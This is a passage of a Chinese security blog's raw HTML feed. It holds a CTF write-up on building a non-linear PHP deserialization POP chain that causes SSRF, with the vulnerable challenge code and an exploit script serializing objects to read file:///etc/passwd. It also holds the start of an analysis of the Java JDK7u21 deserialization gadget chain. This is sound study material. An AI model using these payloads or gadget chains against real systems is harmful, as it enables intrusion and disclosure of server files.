class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filesize-&gt;<span class="variable">$value</span> = <span class="keyword">$this</span>-&gt;date;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GuestShow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$contents</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;2.tostring&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$str</span> = <span class="keyword">$this</span>-&gt;file-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;start&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminShow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filter</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;3.tostring&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;str[<span class="number">0</span>]-&gt;source;</span><br><span class="line">        <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;str[<span class="number">1</span>]-&gt;schema;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;3.get&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;show();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;<span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;3.show&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/usr|auto|log/i&#x27;</span> , <span class="keyword">$this</span>-&gt;source))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$url</span> = <span class="keyword">$this</span>-&gt;schema . <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">        var_dump(<span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$curl</span> = curl_init();</span><br><span class="line">        curl_setopt(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$response</span> = curl_exec(<span class="variable">$curl</span>);</span><br><span class="line">        curl_close(<span class="variable">$curl</span>);</span><br><span class="line">        <span class="variable">$src</span> = <span class="variable">$response</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$src</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;schema !== <span class="string">&#x27;file:///var/www/html/&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;schema = <span class="string">&#x27;file:///var/www/html/&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;wakeup1&#x27;</span>;</span><br><span class="line">            var_dump(<span class="keyword">$this</span>-&gt;schema);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;source !== <span class="string">&#x27;admin.png&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&#x27;admin.png&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;wakeup2&#x27;</span>;</span><br><span class="line">            var_dump(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>差不多就这样，肯定是被我修改过的，加上了很多调试的过程，而且原题是用<code>phar</code>触发，这里我把它改了，直接加上了<code>unserialize()</code>，并且去掉了很多跟构造pop链没关系的代码</p><p>那么简化过后，这题就和我们上面讲的很像嘛，同样是在<code>__wakeup()</code>里面就赋了值，我们无法可控，得通过<code>Upload</code>类中<code>__get($value)</code>进行赋值，还是先给出exp吧，下面再进行详细分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Upload</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filesize</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$date</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GuestShow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$contents</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminShow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filter</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> GuestShow();</span><br><span class="line"><span class="variable">$a1</span> = <span class="keyword">new</span> GuestShow();</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Upload();</span><br><span class="line"><span class="variable">$b1</span> = <span class="keyword">new</span> Upload();</span><br><span class="line"><span class="variable">$b2</span> = <span class="keyword">new</span> Upload();</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> AdminShow();</span><br><span class="line"><span class="variable">$c1</span> = <span class="keyword">new</span> AdminShow();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> -&gt; file = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt; tmp = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span> -&gt; str[<span class="number">0</span>] = <span class="variable">$b1</span>;</span><br><span class="line"><span class="variable">$c</span> -&gt; str[<span class="number">1</span>] = <span class="variable">$b2</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b1</span> -&gt; date = <span class="string">&quot;file:///etc/passwd&quot;</span>;</span><br><span class="line"><span class="variable">$b2</span> -&gt; date = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b1</span> -&gt; filesize = <span class="variable">$c1</span>;</span><br><span class="line"><span class="variable">$b2</span> -&gt; filesize = <span class="variable">$c1</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b2</span> -&gt; tmp = <span class="variable">$a1</span>;</span><br><span class="line"><span class="variable">$a1</span> -&gt; file = <span class="variable">$c1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>先看链子尾吧，链子尾是我们要进行ssrf的地方，那我们要控制的就是<code>$this-&gt;schema</code>和<code>$this-&gt;source</code>，找可以给它们赋值的地方，成功发现<code>Upload</code>类中的<code>__get($value)</code>可以赋值，再找能控制<code>$value</code>的地方，在<code>AdminShow</code>的<code>__toString()</code>方法中正好就有<code>schema</code>和<code>source</code>，那么其实这个思路就比较清楚了，接下来就是找其它的魔术方法，把整条pop链连上就行</p><p>链子头是在<code>GuestShow</code>中的<code>__destruct()</code>中，在里面<code>echo $this</code>调用<code>GuestShow</code>的<code>__toString()</code>，然后由于这三个类中都没有<code>name</code>属性，所以说可以调任意一个<code>__get()</code>方法，这里选择往上调，调<code>Upload</code>类中的，然后由于里面有个<code>echo $this-&gt;tmp</code>，我们把<code>$this-&gt;tmp</code>赋值为一个<code>AdminShow</code>对象，就能进入到<code>AdminShow</code>类中的<code>__toString()</code>方法了，进去之后新建两个<code>Upload</code>对象，利用它们的<code>__get(value)</code>方法，分别给一个新<code>AdminShow</code>对象中的<code>source</code>和<code>schema</code>赋值，赋值后再利用<code>echo $this-&gt;tmp</code>调入进<code>GuestShow</code>中的<code>__toString()</code>方法中，再调入到<code>AdminShow</code>的<code>__get()</code>，最终进入到<code>show()</code>方法中实现ssrf，其实也是一条挺清晰的链子，只不过加上了两次给新对象赋值罢了</p><p><img src="https://s2.loli.net/2022/08/03/7dHTUWeZxJOiQLX.png" alt="image.png"></p><p>给篇参考文章吧，里面讲了<code>NSSCTF Round#3</code>的那道题，大家可以参考着加深理解</p><p>参考文章：<a href="https://www.cnblogs.com/Article-kelp/p/16271464.html">https://www.cnblogs.com/Article-kelp/p/16271464.html</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;聊聊非线性pop链&quot;&gt;&lt;a href=&quot;#聊聊非线性pop链&quot; class=&quot;headerlink&quot; title=&quot;聊聊非线性pop链&quot;&gt;&lt;/a&gt;聊聊非线性pop链&lt;/h1&gt;&lt;p&gt;前两天打强网杯，发现里面一道题还挺有意思，是一道&lt;code&gt;session.upload_progress&lt;/code&gt;上传文件，然后构造pop链触发phar反序列化，最后用ssrf发请求的一道题，其它过程感觉都很平常，但这个pop链还挺有意思的，上网一搜索发现在&lt;code&gt;NSSCTF Round#3&lt;/code&gt;中出过类似的链子，那么接下来就来聊聊这种非线性的pop链&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
    <category term="反序列化" scheme="https://arsenetang.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="php" scheme="https://arsenetang.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Java篇之JDK7u21</title>
    <link href="https://arsenetang.github.io/2022/07/29/Java%E7%AF%87%E4%B9%8BJDK7u21/"/>
    <id>https://arsenetang.github.io/2022/07/29/Java%E7%AF%87%E4%B9%8BJDK7u21/</id>
    <published>2022-07-28T16:00:00.000Z</published>
    <updated>2022-07-29T05:18:00.542Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JDK7u21"><a href="#JDK7u21" class="headerlink" title="JDK7u21"></a>JDK7u21</h1><p>好久没写博客了哇，最近放暑假在实习，平时没啥时间写，周末抽时间来写写；Java的原生类反序列化也是一个老考点了，很早之前就简单的学过，只不过那时候没系统总结，过段时间之后就又忘了，这次把它补上；只不过这个漏洞吧，我感觉主要是学它的思路，实际上能用的地儿挺少的，因为它<code>JDK</code>版本要求必须在7u21之前，这其实是挺苛刻的</p><span id="more"></span><p>前面我们学的一些反序列化漏洞，都需要靠第三方的一些依赖，那么假如在没有第三方依赖的情况下，Java自身是否还有反序列化漏洞存在呢？答案肯定是有的，它就是我们今天要学的漏洞，<code>JDK7u21</code>原生反序列化利用链</p><h2 id="1-链尾"><a href="#1-链尾" class="headerlink" title="1.链尾"></a>1.链尾</h2><p>分析反序列化的链子，我还是更喜欢从后往前分析，也就是说从链尾执行命令开始，一直倒推到最前面；这里我们要聚焦于一个类，它就是<code>sun.reflect.annotation.AnnotationInvocationHandler</code>，其实这个类我们在前面分析cc1链子的时候是用到了的，接下来我们给出它比较关键的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">6182022883658399397L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? extends Annotation&gt; type;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">volatile</span> Method[] memberMethods = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">        <span class="keyword">this</span>.type = var1;</span><br><span class="line">        <span class="keyword">this</span>.memberValues = var2;</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="function"><span class="keyword">private</span> Boolean <span class="title">equalsImpl</span><span class="params">(Object var1)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (var1 == <span class="keyword">this</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">this</span>.type.isInstance(var1)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Method[] var2 = <span class="keyword">this</span>.getMemberMethods();<span class="comment">//获取所有方法</span></span><br><span class="line">            <span class="keyword">int</span> var3 = var2.length;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> var4 = <span class="number">0</span>; var4 &lt; var3; ++var4) &#123;</span><br><span class="line">                Method var5 = var2[var4];</span><br><span class="line">                String var6 = var5.getName();</span><br><span class="line">                Object var7 = <span class="keyword">this</span>.memberValues.get(var6);</span><br><span class="line">                Object var8 = <span class="keyword">null</span>;</span><br><span class="line">                AnnotationInvocationHandler var9 = <span class="keyword">this</span>.asOneOfUs(var1);</span><br><span class="line">                <span class="keyword">if</span> (var9 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    var8 = var9.memberValues.get(var6);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        var8 = var5.invoke(var1);<span class="comment">//执行方法的地方</span></span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InvocationTargetException var11) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IllegalAccessException var12) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(var12);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!memberValueEquals(var7, var8)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> Method[] getMemberMethods() &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.memberMethods == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.memberMethods = (Method[])AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction&lt;Method[]&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> Method[] run() &#123;</span><br><span class="line">                    Method[] var1 = AnnotationInvocationHandler.<span class="keyword">this</span>.type.getDeclaredMethods();</span><br><span class="line">                    AccessibleObject.setAccessible(var1, <span class="keyword">true</span>);</span><br><span class="line">                    <span class="keyword">return</span> var1;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.memberMethods;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码有点儿长，但是逻辑是非常简单的，在<code>equalsImpl</code>方法中调用了<code>this.getMemberMethods</code>方法，在<code>getMemberMethods</code>方法中获取了<code>this.type</code>类中的所有方法并以数组的形式返回；然后循环遍历，利用<code>var5.invoke</code>，依次执行了每个方法；那么我们假设把<code>this.type</code>设置成一个<code>Templates</code>对象，那么它会遍历执行里面的所有的方法，自然就会执行<code>newTransformer()</code> 或<code>getOutputProperties()</code>方法，那么就会触发我们前面所讲的利用链，进而执行命令；这便是<code>JDK7u21</code>的核心原理了</p><h2 id="2-调用equalsImpl"><a href="#2-调用equalsImpl" class="headerlink" title="2.调用equalsImpl"></a>2.调用equalsImpl</h2><p>那么既然进入了<code>equalsImpl</code>方法就能触发调用链，那么现在的问题就是如何调用<code>equalsImpl</code>方法了，它是一个私有方法，我们在本类中找找，发现在这个类中的<code>invoke</code>方法中有调用到，看看代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> </span>&#123;</span><br><span class="line">        String var4 = var2.getName();</span><br><span class="line">        Class[] var5 = var2.getParameterTypes();</span><br><span class="line">        <span class="keyword">if</span> (var4.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; var5.length == <span class="number">1</span> &amp;&amp; var5[<span class="number">0</span>] == Object.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.equalsImpl(var3[<span class="number">0</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">assert</span> var5.length == <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (var4.equals(<span class="string">&quot;toString&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.toStringImpl();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var4.equals(<span class="string">&quot;hashCode&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.hashCodeImpl();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var4.equals(<span class="string">&quot;annotationType&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.type;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//......</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/07/29/6bh98eBoR7vYDcN.png" alt="image.png"></p><p><code>invoke</code>方法，学过动态代理的朋友应该对这个方法太熟了，因为<code>AnnotationInvocationHandler</code>类是实现了<code>InvocationHandler</code>这个接口的，也就是说它可以作为一个动态代理类，那么当调用实现类对象的任意方法时，它都会进入到动态代理类对象中的<code>invoke</code>方法里面；执行<code>invoke</code>时，第一个参数是这个<code>proxy</code>对象，第二个参数是被执行的方法名，第三个参数是执行该方法时的参数列表；那么当调用的方法名为<code>equals</code>时，就会进入到<code>if</code>语句中，从而调用<code>equalsImpl</code>方法</p><h2 id="3-调用equals"><a href="#3-调用equals" class="headerlink" title="3.调用equals"></a>3.调用equals</h2><p>所以说现在的问题就是怎么调用<code>equals</code>了，我们先来简单聊聊<code>equals</code>方法，我感觉任意的java对象都有<code>equals</code>，通常用于比较两个对象是否相同；在开始讲具体哪里调用<code>equals</code>方法之前，我们先来聊聊Java中的两种数据结构：<code>HashMap</code>和<code>HashSet</code></p><p><code>HashMap</code>：<code>HashMap</code>是一个散列表，也就是数据结构里面的哈希表，它里面存储的内容是键值对(key-value)映射；哈希表是由数组+链表来实现的，数组的索引由哈希表的<code>key.hashcode()</code>经过计算得到；也就是说当两对键值对，它们键名的<code>hashcode()</code>相同时，数组的索引也会相同，就会排到同一个链表后面，如下图所示：</p><p><img src="https://s2.loli.net/2022/07/28/omeUsbCPQO1T8AV.png" alt="image.png"></p><p>然后来看<code>HashSet</code>，<code>HashSet</code>是基于<code>HashMap</code>来实现的一个集合，是一个不允许有重复元素的集合，既然它都不允许重复，那么在添加对象的时候，就一定会涉及到比较操作，而它比较的方法，就是将对象保存在<code>HashMap</code>的<code>key</code>处来去重，看看代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">HashSet</span>&lt;<span class="title">E</span>&gt; <span class="keyword">extends</span> <span class="title">AbstractSet</span>&lt;<span class="title">E</span>&gt; <span class="title">implements</span> <span class="title">Set</span>&lt;<span class="title">E</span>&gt;, <span class="title">Cloneable</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span></span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    private <span class="keyword">void</span> readObject(java.io.ObjectInputStream s)</span><br><span class="line">        throws java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in any hidden serialization magic</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in HashMap capacity and load factor and create backing HashMap</span></span><br><span class="line">        int capacity = s.readInt();</span><br><span class="line">        float loadFactor = s.readFloat();</span><br><span class="line">        map = (((HashSet)<span class="built_in">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">               <span class="keyword">new</span> LinkedHashMap&lt;E,<span class="built_in">Object</span>&gt;(capacity, loadFactor) :</span><br><span class="line">               <span class="keyword">new</span> HashMap&lt;E,<span class="built_in">Object</span>&gt;(capacity, loadFactor));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in size</span></span><br><span class="line">        int size = s.readInt();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">        <span class="keyword">for</span> (int i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">            E e = (E) s.readObject();</span><br><span class="line">            map.put(e, PRESENT); <span class="comment">// 看这里，将对象放入一个HashMap的key处</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再来看<code>HashMap</code>中的<code>put</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HashMap</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">extends</span> <span class="title">AbstractMap</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">implements</span> <span class="title">Map</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;, <span class="title">Cloneable</span>, <span class="title">Serializable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (key == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> putForNullKey(value);</span><br><span class="line">        <span class="keyword">int</span> hash = hash(key);</span><br><span class="line">        <span class="keyword">int</span> i = indexFor(hash, table.length);</span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="keyword">null</span>; e = e.next) &#123;</span><br><span class="line">            Object k;</span><br><span class="line">            <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;<span class="comment">//这里触发equals</span></span><br><span class="line">                V oldValue = e.value;</span><br><span class="line">                e.value = value;</span><br><span class="line">                e.recordAccess(<span class="keyword">this</span>);</span><br><span class="line">                <span class="keyword">return</span> oldValue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        modCount++;</span><br><span class="line">        addEntry(hash, key, value, i);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span 